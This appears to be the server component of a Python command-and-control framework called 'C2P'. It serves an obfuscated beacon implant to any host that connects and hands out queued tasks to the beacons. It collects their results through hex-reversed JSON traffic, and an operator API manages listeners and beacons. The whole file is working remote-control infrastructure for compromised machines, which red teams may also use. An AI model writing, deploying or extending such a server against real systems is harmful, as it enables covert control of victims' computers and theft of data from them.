#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
from aiohttp import ClientSession, web, CookieJar, client_exceptions
import uuid
import json
import time
from pathlib import Path

from src.core.logger_config import configure_logger, logger

class Beacon(object):
    """Beacon object"""

    def __init__(self, language="python"):
        self.language = language
        self.uuid = uuid.uuid4()
        self.last_seen = time.time()
        self.tasksinfos = {}
        self.tasks = {}
        self.lock = asyncio.Lock()
    
    def taskExist(self, taskId) -> bool:
        """Check if a task exist"""
        if taskId in self.tasksinfos.keys():
            return True
        return False

    def consumeTasks(self) -> dict:
        """Deliver pending tasks to beacon and change task status to delivered"""
        self.last_seen = time.time()
        tasks = {}
        for taskId, task in self.tasks.items():
            if self.tasksinfos[taskId]['state'] == 'pending':
                self.tasksinfos[taskId]['state'] = 'delivered'
                tasks[taskId] = task
                msg = f"Task delivered "
                if 'name' in self.tasksinfos[taskId].keys():
                    msg += f"'{self.tasksinfos[taskId]['name']}'"
                msg = f"📤 {msg:<60} {self.uuid.hex} : {taskId} "
                logger.info(msg)
        return tasks

    def addTask(self, task) -> str:
        """Add a new pending task that will be consume by beacon, and return task uuid"""
        taskId = uuid.uuid4().hex
        if 'task' not in task.keys() or type(task['task']) != dict:
            return None
        else:
            self.tasks[taskId] = task['task']

        if 'info' in task.keys() and type(task['info']) == dict:
            self.tasksinfos[taskId] = task['info']
        else:
            self.tasksinfos[taskId] = {}

        self.tasksinfos[taskId]['state'] = 'pending'
        self.tasksinfos[taskId]['created'] = time.time()

        msg = f"New task "
        if 'name' in self.tasksinfos[taskId].keys():
            msg += f"'{self.tasksinfos[taskId]['name']}'"
        msg = f"📦 {msg:<60} {self.uuid.hex} : {taskId} "
        logger.info(msg)

        return taskId
    
    def completeTask(self, taskId, result) -> None:
        """Read result and set task as completed"""
        if not self.taskExist(taskId):
            self.tasksinfos[taskId] = {}

        msg = f"Task completed "
        if 'name' in self.tasksinfos[taskId].keys():
            msg += f"'{self.tasksinfos[taskId]['name']}'"
        msg = f"✅ {msg:<60} {self.uuid.hex} : {taskId} "
        logger.info(msg)

        self.tasksinfos[taskId]['result'] = result
        self.tasksinfos[taskId]['state'] = 'completed'
    
    def getTask(self, taskId) -> dict:
        """Get all informations about a task"""
        if not self.taskExist(taskId):
            return {}
        
        return {
            "info": self.tasksinfos[taskId],
            "task": self.tasks[taskId]
        }
        
class C2P(object):
    """C2P class that hold servers and beacons"""
    running = True
    apirunner = None
    extrunner = None
    listeners = {}
    beacons = {}
    client_max_size = 1024**2*99999
    default_ext_host = "0.0.0.0"
    default_ext_port = 8888
    
    async def start(self):
        """Start C2P server class"""
        await self.ApiServer()
        await self.ExtServer()
        await self.AddListener(self.default_ext_host, self.default_ext_port)

    async def cleanup(self):
        """Clean before exit"""
        await self.apirunner.cleanup()
        await self.extrunner.cleanup()

    def encode(self, data):
        """Encode data (obfuscate)"""
        return json.dumps(data).encode().hex()[::-1]
    
    def decode(self, data):
        """Decode data (obfuscate)"""
        if type(data) == bytes:
            data = data.decode()
        if len(data) == 0:
            return {}
        return json.loads(bytes.fromhex(data[::-1]))

    async def GetBeacon(self, beaconuuid):
        """Get beacon object using uuid"""
        beaconuuid = uuid.UUID(beaconuuid)
        if beaconuuid.hex not in self.beacons.keys():
            beacon = Beacon()
            beacon.uuid = beaconuuid
            self.beacons[beacon.uuid.hex] = beacon
            msg = f"Adding old/manual beacon "
            msg = f"♻️  {msg:<60} {beacon.uuid.hex}"
            logger.info(msg)
        else:
            beacon = self.beacons[beaconuuid.hex]
        return beacon

    async def ExtServer(self):
        """Define external listener routes"""
        app = web.Application(client_max_size=self.client_max_size)
        app.add_routes([
        web.get('/', self.EXT_InitPyBeacon),
        web.post('/{beaconuuid}', self.EXT_UpdateBeacon),
        ])

        runner = web.AppRunner(app)
        await runner.setup()

        self.extrunner = runner

    async def ApiServer(self):
        """Start API server"""
        app = web.Application(client_max_size=self.client_max_size)
        app.add_routes([
        web.get('/listener', self.API_GetListeners),
        web.post('/stop', self.API_Stop),
        web.post('/listener/del', self.API_DeleteListener),
        web.post('/listener/add', self.API_AddListener),
        web.get('/beacon', self.API_GetBeacons),
        web.post('/beacon/update/{beaconuuid}', self.API_UpdateBeacon),
        web.get('/beacon/task/{beaconuuid}/{taskId}', self.API_GetBeaconTask),
        ])

        runner = web.AppRunner(app)
        await runner.setup()

        ssl_context = None
        host = "127.0.0.15"
        port = 7641
        site = web.TCPSite(runner, host, port, ssl_context=ssl_context)
        await site.start()
        msg = f"✨​ API server {host}:{port}"
        logger.info(msg)

        self.listeners[f"{host}:{port}"] = site
        self.apirunner = runner

    async def AddListener(self, host, port, ssl_context=None):
        """Add new external listener"""
        site = web.TCPSite(self.extrunner, host, port, ssl_context=ssl_context)
        await site.start()
        self.listeners[f"{host}:{port}"] = site
        msg = f"​🚀​ New listener {host}:{port}"
        logger.info(msg)
        return site

    async def EXT_UpdateBeacon(self, req):
        """Beacon sync endpoint, retrieve results, send tasks"""
        beaconuuid = req.match_info.get('beaconuuid')
        beacon = await self.GetBeacon(beaconuuid)

        data = await req.text()
        data = self.decode(data)
        async with beacon.lock:
            if 'results' in data.keys():
                for taskId, result in data['results'].items():
                    beacon.completeTask(taskId, result)

        async with beacon.lock:
            update = {"tasks": beacon.consumeTasks()}
        return web.Response(body=self.encode(update))

    async def EXT_InitPyBeacon(self, req):
        """Serve python beacon"""
        beacon = Beacon()
        self.beacons[beacon.uuid.hex] = beacon
        msg = f"Serving new beacon "
        msg = f"🌱 {msg:<60} {beacon.uuid.hex}"
        logger.info(msg)

        agent_file_path = Path(__file__).parent.parent / "beacons" / "beacon.py"
        with open(agent_file_path, 'rb') as f:
            content = f.read()
        content = content.replace(b'REPLACEUUID', f"{beacon.uuid.hex}".encode())
        content = content.hex()[::-1]
        return web.Response(text=content, status=200)

    async def API_UpdateBeacon(self, req):
        """Beacon feeder"""
        beaconuuid = req.match_info.get('beaconuuid')
        beacon = await self.GetBeacon(beaconuuid)

        data = await req.text()
        data = json.loads(data)

        tasks = []
        if 'tasks' in data.keys():
            for task in data['tasks']:
                async with beacon.lock:
                    tasks.append(beacon.addTask(task))

        msg = f"Updated"
        return web.json_response({"msg": msg, "tasks": tasks})
    
    async def API_GetBeaconTask(self, req):
        """Retrieve all informations about a task"""
        beaconuuid = req.match_info.get('beaconuuid')
        beacon = await self.GetBeacon(beaconuuid)

        taskId = req.match_info.get('taskId')
        if not beacon.taskExist(taskId):
            msg = "No such task"
            return web.json_response({"msg": msg}, status=404)
        
        return web.json_response(beacon.getTask(taskId), status=200)

    async def API_Stop(self, req):
        """Stop API server"""
        self.running = False
        msg = "Stop request sent"
        logger.info(f"🔴 {msg}")
        return web.json_response({"msg": msg}, status=200)

    async def API_DeleteListener(self, req):
        """Remove listener"""
        data = await req.post()
        host = data.get('host', self.default_ext_host)
        port = data.get('port', self.default_ext_port)
        key = f"{host}:{port}"
        if key not in self.listeners.keys():
            msg = "No active listener found"
            return web.json_response({"msg": msg})
        
        await self.listeners[key].stop()
        del self.listeners[key]

        msg = f"Removed listener {host}:{port}"
        logger.info(f"​❌ {msg}")
        return web.json_response({"msg": msg}, status=200)

    async def API_GetListeners(self, req):
        """List external listeners"""
        listeners = [x for x in self.listeners.keys()]
        return web.json_response(listeners, status=200)

    async def API_GetBeacons(self, req):
        """List external listeners"""
        beacons = [x for x in self.beacons.keys()]
        return web.json_response(beacons, status=200)

    async def API_AddListener(self, req):
        """Add new external listener"""
        data = await req.post()
        host = data.get('host', self.default_ext_host)
        port = data.get('port', self.default_ext_port)
        key = f"{host}:{port}"
        if key in self.listeners.keys():
            msg = "Already listening"
            return web.json_response({"msg": msg})

        await self.AddListener(host, port)
        msg = f"New listener {host}:{port}"
        return web.json_response({"msg": msg}, status=200)

async def StartServer():
    """Start server"""
    configure_logger()
    c2p = C2P()
    await c2p.start()
    while c2p.running:
        try: await asyncio.sleep(0.5)
        except: 
            print("")
            logger.info("🌶️​  Exception received")
            break
    
    logger.info("​🧹​​ Ending C2P")
    await c2p.cleanup()
    logger.info("👋​ Graceful exit")

def main():
    """Start async"""
    asyncio.run(StartServer())